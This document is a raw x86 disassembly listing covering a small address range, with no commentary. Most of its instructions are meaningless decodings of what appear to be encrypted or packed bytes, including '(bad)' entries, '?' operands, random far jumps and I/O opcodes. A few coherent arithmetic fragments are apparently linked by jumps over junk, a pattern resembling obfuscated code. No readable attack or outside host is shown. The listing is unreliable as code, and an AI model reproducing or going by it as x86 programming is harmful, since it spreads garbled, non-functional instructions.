  418fba:	fadd   QWORD PTR [ecx+0x788e471b]
  418fc0:	scas   al,BYTE PTR es:[edi]
  418fc1:	into   
  418fc2:	push   ss
  418fc3:	push   cs
  418fc4:	jecxz  0x418f85
  418fc6:	jmp    0x8b2e:0xd393b524
  418fcd:	push   ebp
  418fce:	or     cl,ch
  418fd0:	retf   0x0
  418fd3:	add    BYTE PTR [ebp-0x21],cl
  418fd6:	or     DWORD PTR [edx-0x100165],ebp
  418fdc:	test   al,0x55
  418fde:	ret    
  418fdf:	dec    esi
  418fe0:	cld    
  418fe1:	push   esp
  418fe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fe3:	adc    DWORD PTR [ebp+0x1e],edx
  418fe6:	add    DWORD PTR [eax],eax
  418fe8:	mov    dl,0x0
  418fea:	add    BYTE PTR [eax],al
  418fec:	aaa    
  418fed:	sti    
  418fee:	push   es
  418fef:	(bad)  
  418ff0:	mov    dl,0xd2
  418ff2:	mov    ebx,0x125429a0
  418ff7:	add    BYTE PTR ds:0x6548ea8a,0xcc
  418ffe:	pop    esp
  418fff:	das    
  419000:	les    esp,FWORD PTR [ecx-0x19f9cb1c]
  419006:	pop    ebx
  419007:	jnp    0x419013
  419009:	repnz xor eax,0xff372922
  41900f:	jecxz  0x41903b
  419011:	enter  0x81df,0xbe
  419015:	mov    WORD PTR [ebx+0x52],es
  419018:	mov    dh,0xe5
  41901a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41901b:	push   es
  41901c:	xchg   esp,eax
  41901d:	xchg   edi,eax
  41901e:	inc    ecx
  41901f:	adc    bh,bh
  419021:	or     BYTE PTR [esi+ebx*8-0x5e],cl
  419025:	and    BYTE PTR [ebx+0x64ad901f],cl
  41902b:	enter  0xd627,0x45
  41902f:	mov    al,ds:0x93566d17
  419034:	lock sbb BYTE PTR [ebp+0xc],ah
  419038:	inc    ebx
  419039:	sbb    al,BYTE PTR [eax+0x33]
  41903c:	fdivr  st(2),st
  41903e:	test   eax,0x9c495798
  419043:	mov    bl,0x28
  419045:	mov    edi,0x2d2e5601
  41904a:	lock and DWORD PTR [ebp+0x726a1a74],ecx
  419051:	pop    edx
  419052:	jnp    0x419097
  419054:	pop    esi
  419055:	pop    eax
  419056:	mov    eax,edi
  419058:	mov    WORD PTR [eax+edx*1],?
  41905b:	shr    edi,0x67
  41905e:	lods   eax,DWORD PTR ds:[esi]
  41905f:	jl     0x419006
  419061:	outs   dx,DWORD PTR ds:[esi]
  419062:	idiv   DWORD PTR [edi]
  419064:	or     eax,0x97f3fc31
  419069:	jecxz  0x419026
  41906b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41906c:	aaa    
  41906d:	add    ah,dh
  41906f:	sti    
  419070:	in     eax,0xc4
  419072:	inc    esp
  419073:	sahf   
  419074:	rcl    BYTE PTR [esi-0x22],cl
  419077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419078:	inc    eax
  419079:	mul    BYTE PTR [esi+0x2615fbe2]
  41907f:	dec    ecx
  419080:	jmp    0xb47f:0x4d463ffe
  419087:	mov    al,0xe0
  419089:	lods   al,BYTE PTR ds:[esi]
  41908a:	and    al,0xc1
  41908c:	ret    0x414f
  41908f:	and    bh,BYTE PTR [edi]
  419091:	mov    dl,0x20
  419093:	inc    esp
  419094:	fnstcw WORD PTR [ebx]
  419096:	add    ebp,DWORD PTR [edx-0x764e6ba1]
  41909c:	gs stos BYTE PTR es:[edi],al
  41909e:	xor    ecx,0xffffdd52
  4190a4:	and    ecx,0x67bd
  4190aa:	jmp    0x419179
  4190af:	pusha  
  4190b0:	test   eax,esi
  4190b2:	test   ch,dh
  4190b4:	cmc    
  4190b5:	je     0x41909c
  4190b7:	add    DWORD PTR [ebp-0x7e],ecx
  4190ba:	int    0xa9
  4190bc:	dec    BYTE PTR [esi+0x6e]
  4190bf:	pop    es
  4190c0:	pop    ds
  4190c1:	add    DWORD PTR [eax],eax
  4190c3:	mov    dl,0x0
  4190c5:	add    BYTE PTR [eax],al
  4190c7:	mov    dh,BYTE PTR [eax]
  4190c9:	daa    
  4190ca:	jg     0x419060
  4190cc:	aam    0xd7
  4190ce:	leave  
  4190cf:	cmp    al,0x76
  4190d1:	jp     0x4190a3
  4190d3:	xor    eax,0xc3870246
  4190d8:	cmp    eax,0xd1238fab
  4190dd:	arpl   WORD PTR [esi],di
  4190df:	(bad)  
  4190e0:	jmp    0x419161
  4190e2:	jns    0x4190a4
  4190e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190e5:	push   edi
  4190e6:	jge    0x41913b
  4190e8:	and    esi,ecx
  4190ea:	adc    ebx,ebx
  4190ec:	jnp    0x41916d
  4190ee:	ins    BYTE PTR es:[edi],dx
  4190ef:	mov    ebx,0xdecaec1a
  4190f4:	pusha  
  4190f5:	pusha  
  4190f6:	push   edx
  4190f7:	icebp  
  4190f8:	(bad)  [ebp+0x75efc4fd]
  4190fe:	xor    al,0x52
  419100:	scas   al,BYTE PTR es:[edi]
  419101:	xchg   ebp,eax
  419102:	jo     0x419104
  419104:	retf   0x69e8
  419107:	(bad)  
  419108:	xor    BYTE PTR [edx-0x65],bl
  41910b:	gs out 0xf5,al
  41910e:	ja     0x4190c2
  419110:	aam    0x52
  419112:	xor    al,0xa
  419114:	mov    eax,0xf1be03b5
  419119:	neg    ah
  41911b:	pop    ss
  41911c:	or     eax,DWORD PTR [edi+0x4014369c]
  419122:	(bad)  
  419123:	std    
  419124:	or     al,0xc8
  419126:	push   esp
  419127:	stos   DWORD PTR es:[edi],eax
  419128:	xchg   ebp,eax
  419129:	xchg   esp,eax
  41912a:	sahf   
  41912b:	jmp    0xbd28:0x8ccb4f0
  419132:	fcomp  QWORD PTR [ecx+0x28]
  419135:	cs pop esp
  419137:	dec    edx
  419138:	sub    eax,0x6d67c544
  41913d:	pushf  
  41913e:	(bad)  
  41913f:	and    ch,dh
  419141:	push   es
  419142:	push   ebp
  419143:	test   al,0x93
  419145:	inc    edi
  419146:	and    al,BYTE PTR [edi]
  419148:	cs (bad) 
  41914a:	jle    0x4191c4
  41914c:	scas   eax,DWORD PTR es:[edi]
  41914d:	sub    al,0x78
  41914f:	outs   dx,BYTE PTR ds:[esi]
  419150:	fucom  st(7)
  419152:	out    dx,eax
  419153:	paddusw mm1,QWORD PTR [edx+0x3a]
  419157:	push   ebp
  419158:	inc    esp
  419159:	mov    esi,0xee7ad35c
  41915e:	fidiv  WORD PTR [edi+esi*4+0x5b]
  419162:	xchg   ebx,eax
  419163:	xor    DWORD PTR [esi-0x45443633],ebx
  419169:	add    cl,BYTE PTR [ebp+0x24414738]
  41916f:	xchg   ebx,eax
  419170:	sub    DWORD PTR [ebx],eax
  419172:	je     0x4191e6
  419174:	imul   ecx,eax,0x81435162
  41917a:	rcr    DWORD PTR [edi+0x9],0x0
  41917e:	add    cl,dl
  419180:	jmp    0x425c6e
  419185:	add    BYTE PTR [eax],bl
  419187:	inc    ebx
  419188:	push   esi
  419189:	sbb    bl,BYTE PTR [edi+0x1f]
  41918c:	pop    esp
  41918d:	inc    ebx
  41918e:	and    eax,0x4c4e5c60
  419193:	push   ebx
  419194:	xlat   BYTE PTR ds:[ebx]
  419195:	xchg   ebp,eax
  419196:	mov    ecx,0xb200011f
  41919b:	add    BYTE PTR [eax],al
  41919d:	add    ch,dl
  41919f:	adc    DWORD PTR [edx+0x67],0x4a
  4191a3:	jecxz  0x419156
  4191a5:	jno    0x419198
  4191a7:	mov    WORD PTR [ecx+0x68dbb9e],ds
  4191ad:	arpl   WORD PTR [esi-0x67ad5e11],dx
  4191b3:	fsin   
  4191b5:	push   ss
  4191b6:	pop    eax
  4191b7:	out    dx,eax
  4191b8:	ins    BYTE PTR es:[edi],dx
  4191b9:	pop    edx
  4191ba:	je     0x41914c
  4191bc:	mov    esi,0xd227f347
  4191c1:	push   edi
  4191c2:	push   ds
  4191c3:	mov    dl,0x74
  4191c5:	xor    DWORD PTR [esi+ecx*8],edx
  4191c8:	adc    ebp,DWORD PTR [edi+0x3e]
  4191cb:	mov    dh,0x31
  4191cd:	fmul   QWORD PTR [eax+0x1a]
  4191d0:	and    DWORD PTR [ebp-0x3],edx
  4191d3:	ins    DWORD PTR es:[edi],dx
  4191d4:	adc    eax,0x70473b03
  4191d9:	popa   
  4191da:	in     eax,dx
  4191db:	sahf   
  4191dc:	mov    edx,0xd16c051a
  4191e1:	iret   
  4191e2:	adc    dh,BYTE PTR [eax+0x59]
  4191e5:	add    eax,0x746d8228
  4191ea:	popa   
  4191eb:	imul   eax,DWORD PTR [ecx+0x59],0x12
  4191ef:	mov    ch,0x6a
  4191f1:	push   esi
  4191f2:	jns    0x41922d
  4191f4:	jbe    0x419257
  4191f6:	retf   
  4191f7:	call   0x288b9cad
  4191fc:	pop    esi
  4191fd:	jbe    0x4191db
  4191ff:	dec    ebp
  419200:	enter  0xd0eb,0x96
  419204:	sar    ah,1
  419206:	inc    esi
  419207:	imul   esi,ebx,0xaa19d6a8
  41920d:	in     eax,dx
  41920e:	cmp    bh,BYTE PTR [ebp-0x11]
  419211:	fwait
  419212:	push   ecx
  419213:	aas    
  419214:	or     al,0x78
  419216:	es clc 
  419218:	mov    BYTE PTR [eax+0x508f7b5c],bh
  41921e:	jb     0x4191d6
  419220:	mov    ds,WORD PTR [eax]
  419222:	out    dx,al
  419223:	mov    DWORD PTR [ecx-0x209a182c],eax
  419229:	xchg   BYTE PTR [edx+0x17],dh
  41922c:	and    ah,bh
  41922e:	icebp  
  41922f:	cmp    al,0xa6
  419231:	hlt    
  419232:	fcomp  QWORD PTR [ecx]
  419234:	cld    
  419235:	inc    ecx
  419236:	ins    BYTE PTR es:[edi],dx
  419237:	dec    edx
  419238:	jl     0x4191c4
  41923a:	sbb    DWORD PTR [ecx+0x805381b],edx
  419240:	mov    edi,es
  419242:	xchg   esp,eax
  419243:	dec    edi
  419244:	mov    esp,0xb87285e5
  419249:	out    dx,al
  41924a:	inc    ebp
  41924b:	xchg   edx,eax
  41924c:	pusha  
  41924d:	cwde   
  41924e:	mov    ds:0x118c8bdc,eax
  419253:	or     al,0xd9
  419255:	(bad)  
  419256:	(bad)  
  419257:	jmp    0x419326
  41925c:	mov    cs,ebp
  41925e:	pop    ebx
  41925f:	sbb    BYTE PTR [ebx-0x62],bl
  419262:	iret   
  419263:	(bad)  
  419265:	and    esp,ebx
  419267:	jo     0x419241
  419269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41926a:	(bad)
  41926e:	add    DWORD PTR [eax],eax
  419270:	mov    dl,0x0
  419272:	add    BYTE PTR [eax],al
  419274:	call   0x7dc4:0x7930158
  41927b:	pop    esp
  41927c:	arpl   WORD PTR [edi-0x71793aa9],di
  419282:	add    DWORD PTR [ebx],ebp
  419284:	jle    0x4192f2
  419286:	neg    BYTE PTR [edx-0x63]
  419289:	mov    al,0xc9
  41928b:	sub    al,ch
  41928d:	add    eax,0x7d2b978
  419292:	hlt    
  419293:	adc    ebp,DWORD PTR cs:[ebp-0x5d]
  419297:	out    0xa9,al
  419299:	test   eax,0xbce471a6
  41929e:	fdivrp st(5),st
  4192a0:	inc    ebx
  4192a1:	or     DWORD PTR [esi+0xb64628a],0xffffffa9
  4192a8:	outs   dx,BYTE PTR ds:[esi]
  4192a9:	jecxz  0x41927a
  4192ab:	pop    ebp
  4192ac:	stos   BYTE PTR es:[edi],al
  4192ad:	loopne 0x419237
  4192af:	bound  ebp,QWORD PTR [ebx]
  4192b1:	jno    0x419320
  4192b3:	pop    ebx
  4192b4:	jge    0x419297
  4192b6:	call   0x8cb0e11d
  4192bb:	jmp    0xc5c59097
  4192c0:	cmp    al,0xca
  4192c2:	test   DWORD PTR [edi-0x3a8ae82e],0x671cded3
  4192cc:	les    edi,FWORD PTR ds:[eax]
  4192cf:	(bad)
  4192d4:	pop    ss
  4192d5:	repz mov dh,dh
  4192d8:	and    al,0x33
  4192da:	and    eax,0x6e6741a8
  4192df:	shl    DWORD PTR [esi],0x6f
  4192e2:	outs   dx,BYTE PTR ds:[esi]
  4192e3:	out    0x7,al
  4192e5:	push   ecx
  4192e6:	iret   
  4192e7:	rcl    BYTE PTR [edx-0x36762e0e],cl
  4192ed:	dec    ebp
  4192ee:	xlat   BYTE PTR ds:[ebx]
  4192ef:	sbb    BYTE PTR [esi],ah
  4192f1:	aad    0xd1
  4192f3:	add    BYTE PTR [edx-0x54],bh
  4192f6:	or     ebx,DWORD PTR [edx]
  4192f8:	adc    esp,edx
  4192fa:	aaa    
  4192fb:	stos   DWORD PTR es:[edi],eax
  4192fc:	addr16 jle 0x41928a
  4192ff:	out    0x4e,al
  419301:	or     ch,cl
  419303:	and    DWORD PTR [ebx],esp
  419305:	xor    DWORD PTR [edx-0x2704f9a8],edx
  41930b:	arpl   WORD PTR [ebp-0x40],bp
  41930e:	cwde   
  41930f:	shr    dh,0x90
  419312:	dec    edi
  419313:	sahf   
  419314:	imul   edi,eax,0xffffffc3
  419317:	out    dx,eax
  419318:	mov    edi,0x88ddbb1c
  41931d:	push   eax
  41931e:	retf   0xd43
  419321:	ret    
  419322:	shl    DWORD PTR [edx-0x7b72d84e],0x8
  419329:	dec    eax
  41932a:	(bad)  
  41932c:	(bad)  
  41932d:	jmp    0x4193fc
  419332:	sub    DWORD PTR [eax],edx
  419334:	mov    ebx,ebx
  419336:	mov    ebx,0xd3f279db
  41933b:	das    
  41933c:	fcmovnb st,st(3)
  41933e:	mov    dh,ah
  419340:	out    0x1c,al
  419342:	sbb    eax,0xb2000121
  419347:	add    BYTE PTR [eax],al
  419349:	add    BYTE PTR [ebp-0x52b4de56],al
  41934f:	popf   
  419350:	add    dl,BYTE PTR ds:0x92c7cb70
  419356:	jl     0x419377
  419358:	pop    esp
  419359:	jnp    0x4193ab
  41935b:	xor    esi,eax
  41935d:	js     0x419332
  41935f:	or     edx,eax
  419361:	sti    
  419362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419363:	pusha  
  419364:	sbb    al,0x16
  419366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419367:	mov    al,0x51
  419369:	xchg   esp,eax
  41936a:	jecxz  0x4193cd
  41936c:	js     0x419330
  41936e:	cmp    dl,BYTE PTR [ecx]
  419370:	push   ss
  419371:	repz test al,0xf4
  419374:	sub    BYTE PTR [edi],dh
  419376:	and    BYTE PTR [edi],cl
  419378:	push   cs
  419379:	nop
  41937a:	aad    0xc9
  41937c:	rol    bl,0x19
  41937f:	and    DWORD PTR ds:0xb915fecc,ebx
  419385:	cwde   
  419386:	sbb    BYTE PTR [ecx-0x30],0xc2
  41938a:	sti    
  41938b:	sbb    dl,BYTE PTR [ebx-0x7d]
  41938e:	inc    edx
  41938f:	mov    ds:0x52f96455,eax
  419394:	les    edx,FWORD PTR [ebx+0x335ef901]
  41939a:	iret   
  41939b:	test   BYTE PTR ds:0x1025cd29,al
  4193a1:	sub    bl,dl
  4193a3:	mov    eax,0xf21f2177
  4193a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193a9:	(bad)  
  4193aa:	adc    ah,BYTE PTR [edx+0x5b11192f]
  4193b0:	pop    ss
  4193b1:	jmp    0x5f4a:0xb10fa5aa
  4193b8:	jns    0x41936b
  4193ba:	mov    fs,WORD PTR [edi+0x24c1aa8]
  4193c0:	mov    ebx,DWORD PTR [esp+eiz*8]
  4193c3:	fcomp  st(0)
  4193c5:	fisub  DWORD PTR [ecx-0x6c]
  4193c8:	cmp    eax,0x21840d73
  4193cd:	mov    esp,DWORD PTR [eax+0x17]
  4193d0:	inc    eax
  4193d1:	arpl   WORD PTR [edx+0x44],dx
  4193d4:	push   eax
  4193d5:	inc    ebx
  4193d6:	dec    esi
  4193d7:	call   FWORD PTR [edx+edx*1]
  4193da:	xchg   ecx,eax
  4193db:	mov    ah,0x5d
  4193dd:	scas   al,BYTE PTR es:[edi]
  4193de:	in     eax,dx
  4193df:	repnz into 
  4193e1:	out    dx,eax
  4193e2:	int    0xeb
  4193e4:	je     0x419451
  4193e6:	cld    
  4193e7:	stos   BYTE PTR es:[edi],al
  4193e8:	dec    eax
  4193e9:	ins    BYTE PTR es:[edi],dx
  4193ea:	sbb    al,0x47
  4193ec:	call   0x7aa51183
  4193f1:	icebp  
  4193f2:	sub    DWORD PTR [eax*8-0x5da70c51],esp
  4193f9:	enter  0x15e0,0x8b
  4193fd:	dec    ebp
  4193fe:	loopne 0x41938b
  419400:	add    cl,ch
  419402:	retf   0x0
  419405:	add    bh,al
  419407:	pop    ebx
  419408:	test   al,0x16
  41940a:	mov    esp,0xeedbfff7
  41940f:	daa    
  419410:	dec    eax
  419411:	fisubr WORD PTR [bp+di+0x278]
  419416:	iret   
  419417:	and    DWORD PTR [ecx],eax
  419419:	add    BYTE PTR [edx-0x69000000],dh
  41941f:	dec    BYTE PTR [edx-0x57]
  419422:	inc    esp
  419423:	add    eax,0xd29de1ff
  419428:	das    
  419429:	or     al,0xa1
  41942b:	jmp    0x419467
  41942d:	test   al,0x51
  41942f:	leave  
  419430:	stc    
  419431:	test   al,0x8b
  419433:	int3   
  419434:	out    dx,eax
  419435:	call   FWORD PTR [ecx]
  419437:	push   edx
  419438:	(bad)  
  419439:	les    edi,FWORD PTR [ecx+0xf]
  41943c:	imul   ebx,ebx,0x788d9591
  419442:	inc    edi
  419443:	pop    ecx
  419444:	jmp    0x51d0:0x6af5aa34
  41944b:	or     ch,dh
  41944d:	bound  ebx,QWORD PTR ss:[edx+eax*4+0x37803a04]
  419455:	xchg   esp,eax
  419456:	push   eax
  419457:	(bad)  
  419458:	lods   eax,DWORD PTR ds:[esi]
  419459:	out    0x45,al
  41945b:	ja     0x419446
  41945d:	add    al,0xb8
  41945f:	retf   0x7368
  419462:	jmp    0x9699550b
  419467:	popf   
  419468:	xchg   ebx,eax
  419469:	inc    esp
  41946a:	push   ebp
  41946b:	shr    BYTE PTR [ebp+0x35],0xf8
  41946f:	mov    al,0x66
  419471:	fdivr  DWORD PTR [ecx+0x41]
  419474:	sub    DWORD PTR [edi+ebx*4+0x812c8f0],0x4b
  41947c:	or     DWORD PTR [edi],edx
  41947e:	and    DWORD PTR [ecx],edi
  419480:	je     0x4194fe
  419482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419483:	inc    esi
  419484:	jge    0x41942a
  419486:	cmp    esp,eax
  419488:	repz cdq 
  41948a:	les    ebp,FWORD PTR [ecx+edi*2]
  41948d:	addr16 jbe 0x419415
  419490:	jmp    0x5800:0xc522c65c
  419497:	stos   BYTE PTR es:[edi],al
  419498:	inc    edx
  419499:	retf   0xd58a
  41949c:	mov    WORD PTR [bx+di-0x1bf6],gs
  4194a1:	sbb    esp,ebp
  4194a3:	jle    0x4194d4
  4194a5:	mov    gs,eax
  4194a7:	fstp   QWORD PTR [edx]
  4194a9:	mov    ?,edx
  4194ab:	sub    DWORD PTR [ecx],esi
  4194ad:	retf   
  4194ae:	inc    edx
  4194af:	mul    DWORD PTR [ecx]
  4194b1:	add    al,0xd6
  4194b3:	inc    eax
  4194b4:	push   eax
  4194b5:	fcmovne st,st(2)
  4194b7:	xor    al,0xb6
  4194b9:	cwde   
  4194ba:	or     eax,0x763b44b3
  4194bf:	jne    0x4194db
  4194c1:	mov    ah,0x2d
  4194c3:	sub    ecx,ebx
  4194c5:	aas    
  4194c6:	out    0x8a,eax
  4194c8:	add    eax,0xf67bc6b9
  4194cd:	jl     0x419527
  4194cf:	lods   al,BYTE PTR ds:[esi]
  4194d0:	or     ecx,0x2ac1
  4194d6:	add    eax,ecx
  4194d8:	mov    ecx,DWORD PTR [ebp-0x24]
  4194db:	sub    eax,ecx
  4194dd:	mov    ecx,DWORD PTR [ebp-0x28]
  4194e0:	lea    eax,[eax+ecx*1-0x5a37]
  4194e7:	jmp    0x4195b6
  4194ec:	mov    BYTE PTR [edx-0x5c547d7d],ah
  4194f2:	mov    DWORD PTR [edx-0x21c7a472],ebp
  4194f8:	aam    0x40
  4194fa:	fsub   QWORD PTR [ecx+0x12281]
  419500:	mov    dl,0x0
  419502:	add    BYTE PTR [eax],al
  419504:	js     0x41954f
  419506:	mov    eax,ds:0xb78fd1a5
  41950b:	fcom   QWORD PTR [esi+0x2d]
  41950e:	into   
  41950f:	aaa    
  419510:	or     dl,BYTE PTR [esi+0x47988450]
  419516:	jo     0x419585
  419518:	or     DWORD PTR [edi-0x3b],edx
  41951b:	jp     0x41954a
  41951d:	outs   dx,DWORD PTR cs:[esi]
  41951f:	not    ch
  419521:	ret    0x711f
  419524:	stos   DWORD PTR es:[edi],eax
  419525:	xchg   esp,eax
  419526:	das    
  419527:	mov    eax,0xfbd20b89
  41952c:	add    al,0x11
  41952e:	push   cs
  41952f:	(bad)  
  419530:	rcr    dl,cl
  419532:	sahf   
  419533:	sbb    DWORD PTR es:[ebx+0x4b],ebp
  419537:	mov    ebp,0x442a1efb
  41953c:	mov    edx,0x181fc0a5
  419541:	icebp  
  419542:	push   ebp
  419543:	jecxz  0x4194d9
  419545:	bound  ebp,QWORD PTR [eax+0x60]
  419548:	push   edx
  419549:	xchg   edx,eax
  41954a:	xchg   ecx,eax
  41954b:	frstor [esi+eax*8-0x3c6c4fe7]
  419552:	jno    0x4195b6
  419554:	into   
  419555:	and    ecx,DWORD PTR [ebx-0x723f43d2]
  41955b:	fidiv  WORD PTR cs:[ebp+0x28]
  41955f:	out    dx,eax
  419560:	popf   
  419561:	jmp    0x419560
  419563:	inc    ebx
  419564:	stc    
  419565:	mov    WORD PTR [edx-0x5f19ae2f],fs
  41956b:	stc    
  41956c:	inc    edx
  41956d:	lods   al,BYTE PTR ds:[esi]
  41956e:	(bad)  
  41956f:	push   ds
  419570:	sbb    al,0xe8
  419572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419573:	xor    DWORD PTR ds:0x55d8b0d1,0x7cb13e7d
  41957d:	xor    ebx,DWORD PTR [eax-0x1e30fffd]
  419583:	jle    0x419510
  419585:	pop    edi
  419586:	outs   dx,BYTE PTR ds:[esi]
  419587:	jb     0x419533
  419589:	inc    eax
  41958a:	inc    ecx
  41958b:	push   edx
  41958c:	in     al,dx
  41958d:	jge    0x419519
  41958f:	lock sbb DWORD PTR [edi],edi
  419592:	mov    ah,0xe0
  419594:	into   
  419595:	inc    edi
  419596:	sub    eax,0xec357e15
  41959b:	xchg   edx,eax
  41959c:	ficomp WORD PTR [edi-0x56]
  41959f:	pop    edx
  4195a0:	imul   ecx,ebp,0xffffffa0
  4195a3:	push   cs
  4195a4:	sub    DWORD PTR [ebp-0x5c],esp
  4195a7:	xlat   BYTE PTR ds:[ebx]
  4195a8:	sbb    dh,BYTE PTR [ecx-0x509bc62a]
  4195ae:	cwde   
  4195af:	inc    esp
  4195b0:	jno    0x4195f7
  4195b2:	and    ch,BYTE PTR ds:0xd8b9618
  4195b8:	cmp    dl,dh
  4195ba:	inc    edx
  4195bb:	add    BYTE PTR [ecx],al
  4195bd:	or     BYTE PTR [ebx+0x4d8b9845],cl
  4195c3:	pushf  
  4195c4:	mov    edx,DWORD PTR [ebp-0x70]
  4195c7:	mov    esi,DWORD PTR [ebp-0x6c]
  4195ca:	jmp    0x419699
  4195cf:	cmp    ebx,DWORD PTR [ecx+0x4d]
  4195d2:	imul   ebp,DWORD PTR [edi+0x7f],0x3f
  4195d6:	pop    ecx
  4195d7:	js     0x419651
  4195d9:	pop    esp
  4195da:	pop    edi
  4195db:	cmp    DWORD PTR [ebp+esi*8+0x123333f],esi
  4195e2:	add    BYTE PTR [edx-0x1a000000],dh
  4195e8:	mov    ds,ebx
  4195ea:	inc    esp
  4195eb:	mov    ecx,0xf0330db
  4195f0:	xchg   ecx,eax
  4195f1:	repnz inc edi
  4195f3:	cmp    esi,esi
  4195f5:	rol    DWORD PTR [edx+0x1b47de62],0x69
  4195fc:	test   DWORD PTR [edx-0x19b47aaf],0x88e0eb24
  419606:	repz and DWORD PTR [edi],esi
  419609:	sbb    eax,esp
  41960b:	mov    al,0x1b
  41960d:	(bad)  
  41960e:	mov    bl,0xd
  419610:	mov    ds:0x136b2ff,al
  419615:	js     0x419668
  419617:	shl    eax,1
  419619:	neg    ebp
  41961b:	mov    edx,0x7382fb28
  419620:	lea    ebx,[ebx+0x69ea6975]
  419626:	das    
  419627:	pop    ss
  419628:	cdq    
  419629:	push   ecx
  41962a:	outs   dx,DWORD PTR ds:[esi]
  41962b:	mov    al,ds:0x56c8847a
  419630:	pop    es
  419631:	push   es
  419632:	jle    0x4196a5
  419634:	jge    0x419627
  419636:	pop    eax
  419637:	jp     0x41960f
  419639:	dec    edi
  41963a:	jns    0x419675
  41963c:	pop    ebp
  41963d:	xor    ah,BYTE PTR [esi+0x50]
  419640:	in     eax,dx
  419641:	aad    0x19
  419643:	mov    esp,0x41e8d523
  419648:	push   0xffffff96
  41964a:	jne    0x419696
  41964c:	jmp    0x2d35755f
  419651:	ins    BYTE PTR es:[edi],dx
  419652:	cld    
  419653:	inc    DWORD PTR [edx+0x2a]
  419656:	fwait
  419657:	repnz xor edi,DWORD PTR ds:0x79098fcc
  41965e:	pop    ds
  41965f:	xor    DWORD PTR [ecx-0x28],esi
  419662:	or     eax,esp
  419664:	push   0xffffffc0
  419666:	or     DWORD PTR [eax+0x65],0x43a4606d
  41966d:	cmc    
  41966e:	jnp    0x4196ac
  419670:	mov    dh,0xa6
  419672:	bound  ebx,QWORD PTR [ecx-0x6c]
  419675:	and    al,0x7e
  419677:	sbb    ah,BYTE PTR [esi+0x15]
  41967a:	in     al,0xb1
  41967c:	inc    ecx
  41967d:	out    0x45,al
  41967f:	gs dec esp
  419681:	call   0x99fe7f61
  419686:	jg     0x419702
  419688:	test   DWORD PTR [edi+0x2100998b],eax
  41968e:	cld    
  41968f:	pop    es
  419690:	ja     0x419639
  419692:	sar    BYTE PTR [ebp+ebp*1+0x7e147c76],0x35
  41969a:	mov    ecx,0x8100007d
  41969f:	icebp  
  4196a0:	adc    DWORD PTR [eax+eax*1+0x0],ebx
  4196a4:	sub    eax,edx
  4196a6:	mov    edx,DWORD PTR [ebp-0x78]
  4196a9:	sbb    ecx,esi
  4196ab:	mov    esi,DWORD PTR [ebp-0x74]
  4196ae:	or     eax,edx
  4196b0:	mov    edx,DWORD PTR ds:0x42f238
  4196b6:	jmp    0x419785
  4196bb:	xlat   BYTE PTR ds:[ebx]
  4196bc:	ja     0x4196d7
  4196be:	xchg   BYTE PTR [ecx+0x4077dfee],bh
  4196c4:	push   esi
  4196c5:	call   0xe533:0x142e3639
  4196cc:	and    eax,DWORD PTR [ecx]
  4196ce:	add    BYTE PTR [edx-0x37000000],dh
  4196d4:	daa    
  4196d5:	jo     0x419689
  4196d7:	dec    ebp
  4196d8:	in     eax,dx
  4196d9:	js     0x419670
  4196db:	or     edi,edx
  4196dd:	xor    eax,0xc544882e
  4196e2:	sbb    DWORD PTR [ebx],ebx
  4196e4:	daa    
  4196e5:	inc    ecx
  4196e6:	cmp    al,BYTE PTR [ebp+0x5e9a3644]
  4196ec:	jnp    0x419689
  4196ee:	jae    0x4196fc
  4196f0:	repz jle 0x4196bf
  4196f3:	shr    DWORD PTR [si],0x67
  4196f7:	push   ebx
  4196f8:	shl    BYTE PTR [ebx],0x24
  4196fb:	push   ds
  4196fc:	sbb    al,0xc3
  4196fe:	mov    eax,0x7c909444
  419703:	push   cs
  419704:	xor    ch,BYTE PTR [edi+ecx*2]
  419707:	stos   DWORD PTR es:[edi],eax
  419708:	lea    esp,[ebp-0x21]
  41970b:	xlat   BYTE PTR ds:[ebx]
  41970c:	inc    ebx
  41970d:	je     0x4196cb
  41970f:	mov    dh,0x68
  419711:	jg     0x419764
  419713:	mov    bh,BYTE PTR [ebx]
  419715:	scas   al,BYTE PTR es:[edi]
  419716:	popf   
  419717:	mov    ah,0x2e
  419719:	xchg   edx,eax
  41971a:	mov    eax,0x44fa23a
  41971f:	or     al,0x33
  419721:	mov    eax,ds:0xbc81a2a9
  419726:	xchg   DWORD PTR [eax+edx*1-0x4e154143],ebx
  41972d:	push   0xffffffa1
  41972f:	push   eax
  419730:	fsubr  DWORD PTR [eax]
  419732:	leave  
  419733:	mov    dh,0x0
  419735:	data16 js 0x41970c
  419738:	sahf   
  419739:	scas   al,BYTE PTR es:[edi]
  41973a:	inc    esi
  41973b:	push   edx
  41973c:	xlat   BYTE PTR ds:[ebx]
  41973d:	mov    esi,0x2f43471c
  419742:	dec    esi
  419743:	fincstp 
  419745:	pop    edx
  419746:	or     eax,0x7fa6a667
  41974b:	xlat   BYTE PTR ds:[ebx]
  41974c:	push   ebp
  41974d:	and    bl,BYTE PTR [eax-0x3e83453a]
  419753:	aam    0x1b
  419755:	arpl   WORD PTR [edi],bp
  419757:	xchg   ebx,eax
  419758:	mov    bl,0xbb
  41975a:	cwde   
  41975b:	je     0x419781
  41975d:	retf   
  41975e:	je     0x419771
  419760:	sti    
  419761:	cmp    ebp,DWORD PTR [esp+ebp*8-0x7165432e]
  419768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419769:	test   al,0xbb
  41976b:	cmp    bh,dh
  41976d:	fild   DWORD PTR [esi+0x7036afe7]
  419773:	pop    ecx
  419774:	xor    eax,0xcbbde92e
  419779:	sar    DWORD PTR [ebx],cl
  41977b:	ret    
  41977c:	(bad)  
  41977d:	rcr    esi,cl
  41977f:	and    eax,0xe4fad306
  419784:	fimul  WORD PTR [ebx]
  419786:	into   
  419787:	xor    eax,0x56d7
  41978c:	xor    ecx,0xfffffcb9
  419792:	xor    esi,esi
  419794:	cmp    edx,eax
  419796:	jne    0x41989d
  41979c:	cmp    esi,ecx
